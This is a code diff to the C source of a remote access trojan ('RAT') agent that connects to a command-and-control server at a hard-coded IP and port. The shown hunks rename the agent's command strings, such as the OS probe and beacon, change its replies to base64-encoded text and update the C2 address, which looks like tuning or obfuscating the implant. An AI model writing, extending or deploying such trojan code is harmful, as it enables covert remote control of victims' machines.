@@ -177,10 +177,10 @@ void RAT(char* C2_Server, int C2_Port)
                     memset(CommandReceived, 0, sizeof(CommandReceived));
                 }
                 // Operating System
-                else if ((strcmp(command, "UHJvYmluZyBPcGVyYXRpbmcgU3lzdGVt") == 0))
+                else if ((strcmp(command, "operating-system-probe") == 0))
                 {
                     char buffer[257] = "";
-                    strcat(buffer, "Linux");
+                    strcat(buffer, "bGludXgK");
                     //strcat(buffer, "\n");
                     send(tcp_sock, buffer, strlen(buffer) + 1, 0);
 
@@ -190,13 +190,13 @@ void RAT(char* C2_Server, int C2_Port)
                 else if (strcmp(command, "ping") == 0)
                 {
                     char buffer[64] = "";
-                    strcat(buffer,"[*Agent-msg] PONG\n");
+                    strcat(buffer,"PONG\n");
                     send(tcp_sock,buffer,strlen(buffer) + 1, 0);
 
                     memset(buffer, 0, sizeof(buffer));
                     memset(CommandReceived, 0, sizeof(CommandReceived));
 			    }
-                else if (strcmp(command, "beacon") == 0)
+                else if (strcmp(command, "beacon-probe") == 0)
                 {
                     char buffer[128] = "";
                     strcat(buffer,"d2hhdCBhIGdyZWF0IGRheSB0byBzbWVsbCBmZWFy");
@@ -339,9 +339,9 @@ void RAT(char* C2_Server, int C2_Port)
 
 int main (int argc, char **argv)
 {
-    char host[] = "192.168.17.10";     // change this to your ip address
+    char host[] = "192.168.75.100";     // change this to your ip address
     int port = 1337;                    // change this to your open port
     RAT(host, port);
 
-  return 0;
+    return 0;
 }
